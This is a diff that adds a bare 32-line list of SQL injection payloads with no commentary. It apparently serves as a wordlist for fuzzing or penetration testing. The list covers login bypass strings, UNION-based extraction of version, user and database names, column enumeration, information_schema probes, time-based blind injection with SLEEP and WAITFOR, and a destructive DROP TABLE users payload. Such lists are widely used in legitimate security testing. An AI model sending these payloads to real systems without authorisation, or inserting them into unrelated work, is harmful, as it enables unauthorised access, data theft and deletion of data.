@@ -1,0 +1,32 @@
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+' UNION SELECT 1,2,3 --
+' UNION SELECT null,null,null --
+' AND 1=1 --
+' AND 1=2 --
+admin'--
+admin' #
+admin'/*
+' OR 1=1#
+' OR 1=1--
+') OR '1'='1--
+') OR ('1'='1--
+' OR 1=1 LIMIT 1 --
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' GROUP BY 1--
+' HAVING 1=1--
+' UNION ALL SELECT 1,2,3--
+' UNION SELECT @@version,2,3--
+' UNION SELECT user(),2,3--
+' UNION SELECT database(),2,3--
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' AND (SELECT COUNT(*) FROM information_schema.columns) > 0 --
+'; WAITFOR DELAY '00:00:05' --
+'; SELECT SLEEP(5) --
+' AND SLEEP(5) --
+' OR SLEEP(5) --
+' UNION SELECT SLEEP(5),2,3 --
